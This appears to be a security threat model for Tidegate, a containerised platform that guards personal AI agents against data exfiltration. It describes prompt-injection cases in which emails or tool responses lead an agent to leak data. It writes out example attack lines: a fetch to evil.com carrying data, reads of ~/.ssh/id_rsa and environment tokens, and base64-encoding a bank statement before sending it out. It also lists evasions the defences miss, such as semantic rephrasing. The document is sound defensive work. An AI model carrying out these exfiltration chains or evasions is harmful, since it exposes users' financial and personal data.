# Tidegate — Threat Model

## Primary user: the personal assistant operator

Tidegate's threat model centers on a personal user — someone who runs an AI agent as a daily assistant. They process bank statements, tax documents, emails, medical records, and personal files. They install skills from community marketplaces without careful vetting. They are the highest-risk, lowest-attention audience for malicious extensions.

This user is also the easiest social engineering target. A malicious email saying "I'm Bob's wife, emailing from a different account — he forgot to send me [x]" will trick the agent into composing a tool call that exfiltrates personal data through a legitimate channel.

## What the agent can access

The agent has broad read access to sensitive data:

- **Workspace files** — tax returns, bank statements, medical records, personal documents mounted into the container
- **Tool call results** — emails from Gmail, calendar events, search results, database records (tool responses become inputs to the next tool call)
- **User conversation history** — names, addresses, financial details, anything shared in conversation
- **Agent memory** — persistent context across sessions, potentially containing sensitive data from prior conversations

The key insight is **circular data flow**: the agent calls a Gmail tool, gets email content, then passes that content to a Slack tool. Sensitive data from one tool's response becomes the next tool's input. Every outbound tool call parameter is a potential exfiltration vector.

**What the agent CANNOT access**: API credentials. They live in MCP server containers, injected at startup. The agent never sees API keys, tokens, or passwords — not in memory, not on the filesystem, not via the network.

**One exception**: the LLM API key must exist in the agent container (it's how the agent thinks). This is a hard architectural limit.

## Real-world incidents that shaped this threat model

These are documented attacks against AI agent ecosystems, not hypotheticals.

### Malicious marketplace skills

**ClawHavoc (2025)**: Researchers planted 1,184 malicious skills on ClawHub. Over 42,000 installations before detection. Attack patterns included credential theft from environment variables, `fetch()` calls to attacker-controlled servers, and reading SSH keys from `~/.ssh/`. The skills passed ClawHub's automated review because they performed legitimate functions alongside the malicious code.

**postmark-mcp**: First documented malicious MCP server on npm. Exfiltrated data through a legitimate-looking email sending interface.

### Prompt injection via content

**Superhuman email exfil**: A single unopened email in a user's inbox contained prompt injection that caused the agent to exfiltrate 40+ emails to an attacker-controlled address. The user never opened the email — the agent read it as part of inbox processing.

**EchoLeak (CVE-2025-32711, CVSS 9.3)**: MCP tool responses containing prompt injection caused agents to leak conversation context through subsequent tool calls. The injection was in the *response* from a legitimate MCP server, not in user input.

### Agent framework vulnerabilities

**Claude Desktop Extensions zero-click RCE (CVSS 10.0)**: Remote code execution through malicious MCP server responses, requiring zero user interaction.

**Cursor RCE**: Multiple remote code execution vulnerabilities in the Cursor IDE's agent integration, exploitable through crafted project files.

### State-sponsored

**GTG-1002**: First documented state-sponsored campaign specifically targeting AI agent infrastructure for espionage. Demonstrates that agent security is now a nation-state concern.

## What Tidegate protects

Tidegate is a secure deployment platform. The user installs Tidegate instead of installing an agent framework directly. Tidegate includes the agent (OpenClaw, etc.) pre-configured inside a container topology with three enforcement layers.

### Enforcement layer 1: seccomp-notify command interception + skill hardening (hard boundary)

Layer 1 intercepts every `execve` syscall in the agent container using a kernel-level seccomp filter. **No security code runs inside the agent container** — the interception is in the kernel, and all decision-making happens in the `tg-scanner` container.

**How it works**: A custom OCI runtime wrapper (`tidegate-runtime`) injects a seccomp-notify filter into the agent container's configuration before passing it to `runc`. The filter pauses every `execve` syscall and notifies `tg-scanner`, which:

1. Reads the command and arguments from `/proc/<pid>/mem`
2. Reads the script source from the shared read-only workspace volume
3. Analyzes the script for file discovery patterns (e.g., `glob.glob("**/*.csv")`)
4. Resolves those patterns against the shared volume and reads matching files
5. Sends file contents to the scanner as values
6. Analyzes the command/script for encoding and exfiltration patterns
7. Correlates: sensitive files + encoding/exfil intent → deny (returns `EPERM`)
8. Otherwise: allows the `execve` to proceed

This is **load-bearing, not a bonus layer.** Without it, a skill can read your bank statement, base64-encode it, and exfiltrate the encoded data to an allowed domain. Layers 2 and 3 scan outbound values for patterns — but patterns are destroyed by encoding. Layer 1 catches sensitive data *before* it's encoded, breaking the attack chain at step 2:

1. Read sensitive data (can't block — user mounted the files)
2. **Encode/encrypt it (Layer 1 blocks here)**
3. Exfiltrate encoded data (Layers 2/3 are blind to encoded content)

This is a **hard boundary** — the seccomp filter is installed by the kernel at container creation and cannot be removed or bypassed from userspace. Unlike a shell wrapper (which only intercepts commands going through `/bin/sh`), seccomp-notify catches every `execve` regardless of how it's invoked — direct syscalls from Python, Node.js, alternate shells, binaries written to tmpfs, `memfd_create` + `fexecve`.

**Skill hardening**: When a user installs a skill, Tidegate rewrites the SKILL.md — stripping `!`command`` preprocessing (which executes shell commands at load time before any hooks fire), constraining `allowed-tools` in the frontmatter, and wrapping bundled scripts. This operates on the cross-platform SKILL.md file format and works regardless of agent framework.

**Agent-specific hooks**: On Claude Code, Tidegate also installs PreToolUse hooks that scan tool arguments before execution. Other agent frameworks get seccomp-notify interception (universal) but not framework-specific hooks.

### Enforcement layer 2: Tidegate MCP gateway (hard boundary)

All MCP tool calls from the agent pass through the Tidegate gateway over the network. The gateway mirrors downstream MCP servers' tool lists and scans all outbound parameter values. This is a **hard boundary** — the agent container cannot reach MCP servers directly (separate Docker network).

The gateway:
- Mirrors tool definitions from downstream MCP servers (no per-field YAML mappings needed)
- Scans all outbound parameter values for credentials, financial instruments, government IDs
- Optionally restricts which tools are visible (tool allowlist)
- Returns shaped denies (`isError: false`) so the agent adjusts instead of retrying
- Scans responses before returning them to the agent
- Logs every tool call for audit

### Enforcement layer 3: agent-proxy (hard boundary)

Skills need HTTP access for their APIs — you can't block all internet from the agent container. The agent-proxy replaces a simple CONNECT-only egress proxy with selective behavior:

- **LLM API domains**: CONNECT passthrough (end-to-end TLS, no inspection)
- **Skill-allowed domains**: MITM + scan + credential injection (skills never hold API keys)
- **Everything else**: blocked

This is a **hard boundary** — the agent container's only path to the internet is through the proxy. A skill that tries `fetch("https://evil.com/exfil")` gets blocked because `evil.com` isn't on any allowlist.

Credential injection through the proxy means skills never see API keys. The proxy adds authentication headers to outbound requests, so credentials exist only in the proxy's configuration, not in the agent container.

## Sensitive data categories

### Detectable with high confidence (pattern-based)

These have structural signatures that regex + algorithmic validation match reliably. All scanning runs on all outbound values — no field-level classification needed.

| Category | Examples | Detection method | Why it matters |
|---|---|---|---|
| **Credentials** | API keys, tokens, passwords | Vendor-prefix regex (AWS `AKIA`, Slack `xoxb-`, GitHub `ghp_`, etc.) | Account compromise |
| **Financial instruments** | Credit card numbers, IBANs | Regex + Luhn/mod-97 checksum (zero false positives) | Direct financial harm |
| **Government identifiers** | SSNs, EINs (with context keywords) | Regex + area validation + required context | Identity theft |

L2 patterns (Luhn, IBAN, SSN) are **zero false-positive by design** — they use mathematical checksums. This is why blob scanning works: running these checks on every outbound value, including channel IDs and commit SHAs, produces no spurious alerts.

### Detectable with low confidence

| Category | Examples | Why detection is unreliable |
|---|---|---|
| **Phone numbers** | US/international formats | Port numbers, version strings, numeric IDs trigger false positives |
| **Email addresses** | user@domain.com | Legitimate in almost every API call — accurate but not actionable |
| **Person names** | First/last names | NER fires on CamelCase code identifiers |

### Not detectable by pattern matching

| Category | Examples | Why it's undetectable |
|---|---|---|
| **Proprietary code** | Source code from workspace files | No pattern distinguishes proprietary from public code |
| **Private conversation content** | User messages, discussion history | Free-form natural language, no structural marker |
| **Personal documents** | Tax returns, medical records (text content) | Unstructured text |
| **Internal infrastructure** | Hostnames, network topology, configs | Varies too widely for pattern matching |

## Adversary profiles

### LLM-mediated attack (most common, most dangerous)

Prompt injection — via malicious email, document, or skill response — tricks the agent into including sensitive data in a legitimate tool call. The agent doesn't know it's being manipulated. This is the Superhuman and EchoLeak pattern.

**Blocked by**:
- tg_ wrapper scans the tool call parameters before execution (Layer 1)
- Tidegate gateway scans all outbound values (Layer 2, hard boundary)
- For non-MCP HTTP calls, agent-proxy scans request bodies (Layer 3, hard boundary)

**Not blocked**: Semantic rephrasing. If the agent summarizes a credit card number as "the card ending in 4242 with expiry next March," no pattern scanner catches it.

### Malicious marketplace skill (ClawHavoc pattern)

A skill contains code that directly attempts exfiltration — `fetch()` to an attacker server, reading credentials from environment, accessing SSH keys.

**Blocked by**:
- `fetch("https://evil.com")` — blocked by agent-proxy (domain not allowlisted) (Layer 3)
- Reading credentials from `process.env` — no credentials exist in agent container
- Reading `~/.ssh/` — not mounted into agent container
- Exfiltrating via MCP tool call parameters — scanned by gateway (Layer 2)

**Not blocked**: Reading workspace files that the user intentionally mounted. The skill can read any file the agent can read. This is a hard architectural limit — the user mounted those files because they want the agent to use them.

### Encryption before exfiltration

A skill or prompt injection causes the agent to encode sensitive data before exfiltrating it, defeating pattern-based scanning at the network boundary.

Attack chain: read bank statement → `base64 < statement.csv` → send encoded blob to allowed domain. Layers 2 and 3 see a high-entropy string going to a legitimate API — no credit card patterns, no SSN formats, nothing to match.

**Blocked by**: Layer 1 seccomp-notify interception. When `execve("base64", ...)` is called, the kernel pauses the syscall and notifies `tg-scanner`. The command evaluator reads `statement.csv` from the shared read-only volume, sends its contents to the scanner, scanner finds credit card numbers (Luhn match). The command evaluator sees the command involves encoding. Sensitive input + encoding operation → deny (`EPERM`). The command never executes.

Even if the attack uses a Python script instead of a direct `base64` command (e.g., `python3 encode_and_send.py`), `tg-scanner` reads the script source from the shared volume, identifies encoding imports + file I/O patterns, resolves file discovery patterns (like `glob("**/*.csv")`), reads the matching files, and blocks the execution.

### Prompt injection with semantic rephrasing

Attacker crafts input causing the agent to rephrase sensitive data as natural language, defeating all pattern-based scanning.

**Not blocked**: "The card ending in 4242 with expiry next March" contains no scannable pattern. This is the fundamental limit of all scanning-based approaches, across all layers.

### Compromised MCP server (supply chain)

A community MCP server is backdoored — it sends malicious responses or exfiltrates data it receives.

**Partially blocked by**: Response scanning catches credentials/financial data in MCP server responses before they reach the agent. Credential isolation means the compromised server only has its own API keys.

**Not blocked**: The server can silently misuse its own API access (e.g., a Slack MCP server could post to channels the user didn't intend). This is inherent to the MCP trust model.

### Direct container escape

An attacker with arbitrary code execution escapes the Docker container.

**Not blocked**: Docker shares the host kernel. Mitigated by: `cap_drop: ALL`, `no-new-privileges: true`, `read_only: true`, resource limits. For higher assurance, use gVisor or Firecracker.

## Attack surface map

```
agent container (agent-net, internal, HTTPS_PROXY=agent-proxy)
  ├── agent framework (OpenClaw / Claude Code / etc.)
  │     ├── hardened skills (rewritten SKILL.md)
  │     ├── Claude Code also gets PreToolUse hooks
  │     ├── workspace files: READABLE (user mounted them)
  │     ├── credentials: NONE (not in container)
  │     ├── SSH keys: NONE (not mounted)
  │     └── seccomp filter: every execve notifies tg-scanner  ← Layer 1 (hard)
  │
  ├──────→ tg-scanner (on agent-net)                          ← Layer 1 decision-maker
  │           ├── receives execve notifications via seccomp fd
  │           ├── reads /proc/<pid>/mem for command args
  │           ├── reads workspace files (shared read-only volume)
  │           ├── command evaluator: parses script, resolves globs
  │           ├── scanner: value → allow/deny
  │           └── returns ALLOW or EPERM
  │
  │ MCP tool calls (Streamable HTTP)
  ├──────→ tidegate (mirrors + scans all values)       ← Layer 2 (hard)
  │              │
  │              │ MCP (Streamable HTTP)
  │              ▼
  │         mcp-net (internal) → MCP server containers → internet
  │              └── credentials live HERE only
  │
  │ ALL other HTTPS (skill HTTP + LLM API)
  └──────→ agent-proxy (MITM for skills)               ← Layer 3 (hard)
             ├── LLM domains: CONNECT passthrough
             ├── skill domains: MITM + scan + credential injection
             └── everything else: BLOCKED
                   │
                   ▼ proxy-net → internet
```

## Honest scorecard: ClawHavoc through the architecture

Tracing ClawHavoc's actual attack patterns through Tidegate:

| Attack pattern | Result | Why |
|---|---|---|
| `fetch("https://evil.com/exfil?data=...")` | **BLOCKED** | `evil.com` not on agent-proxy allowlist |
| `process.env.SLACK_TOKEN` | **BLOCKED** | No credentials in agent container |
| Read `~/.ssh/id_rsa` | **BLOCKED** | SSH keys not mounted |
| Read workspace files | **ALLOWED** | User mounted them intentionally — hard limit |
| Embed credit card in Slack message | **BLOCKED** | L2 Luhn checksum catches it at gateway |
| Base64-encode bank statement, send to allowed domain | **BLOCKED** | seccomp-notify intercepts execve; tg-scanner reads file from shared volume, finds credit cards, blocks encoding |
| Python script with `glob("*.csv")` + `base64` + `urllib` | **BLOCKED** | seccomp-notify intercepts `python3` execve; tg-scanner reads script source, resolves glob, scans matching files |
| Rephrase sensitive data as prose | **NOT BLOCKED** | No pattern scanner catches semantic encoding |
| Exfiltrate via LLM API request | **NOT BLOCKED** | LLM API key must exist in agent container |

## Residual risks (accepted)

1. **Semantic exfiltration**: A determined agent can embed sensitive data as innocuous natural language in tool call parameters. No pattern-based detection can catch this. This is the fundamental limit of all scanning-based approaches.

2. **Workspace file access**: Files mounted into the agent container are readable by any skill. This is by design — the user wants the agent to use these files. We cannot distinguish legitimate use from exfiltration at the file-read level.

3. **LLM API as exfiltration channel**: The LLM API key must exist in the agent container. A sophisticated attacker could encode data in API requests. Low bandwidth, high complexity, accepted risk.

4. **MCP server supply chain**: If a community MCP server is backdoored, it can misuse its own API access. Mitigated by: pinning versions, reviewing server code, credential scoping (each server only gets its own keys).

5. **Kernel escape**: Docker shares the host kernel. Mitigated by: hardened container config, no root, dropped capabilities. For higher assurance: gVisor or Firecracker.

6. **Network topology misconfiguration**: If Docker networks are misconfigured, the agent can bypass the gateway. Mitigated by: compose templates that enforce the topology, verification tests.

7. **TOCTOU on seccomp-notify**: After tg-scanner reads execve arguments from `/proc/<pid>/mem`, another thread in the agent container could theoretically modify that memory before the kernel uses it. Narrow risk — agent processes are typically single-threaded, and the notification validity check (`SECCOMP_IOCTL_NOTIF_ID_VALID`) mitigates PID recycling.

8. **tg-scanner availability**: If tg-scanner crashes, pending syscalls get `ENOSYS` (fail-open). Mitigated by: hard seccomp-bpf fallback filter that kills the agent container if the notification listener disconnects.

9. **Obfuscated scripts**: A script that uses `eval()`/`exec()` to hide its intent at the source level. tg-scanner can flag these patterns as suspicious, but cannot fully analyze dynamically constructed code. Mitigated by: L2/L3 network boundaries catch the outbound data if it reaches them unencoded.
